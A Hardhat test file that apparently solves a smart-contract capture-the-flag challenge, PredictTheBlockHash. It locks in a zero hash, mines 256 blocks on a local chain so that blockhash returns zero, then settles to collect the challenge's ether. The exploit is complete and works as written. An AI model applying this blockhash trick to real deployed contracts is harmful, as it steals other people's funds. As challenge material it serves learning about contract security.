import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    let blockHash = "0x0000000000000000000000000000000000000000000000000000000000000000";
    await target.lockInGuess(blockHash, { value: utils.parseEther('1') });

    const initBlockNumber = await ethers.provider.getBlockNumber();

  let lastBlockNumber = initBlockNumber;
  do {
    try {
      lastBlockNumber = await ethers.provider.getBlockNumber();
      console.log(`Block number: ${lastBlockNumber}`);
      await provider.send("evm_mine", []);
    } catch (err) {
      console.log(err);
    }
  } while (lastBlockNumber - initBlockNumber < 256);

  const attackTx = await target.settle();
  await attackTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
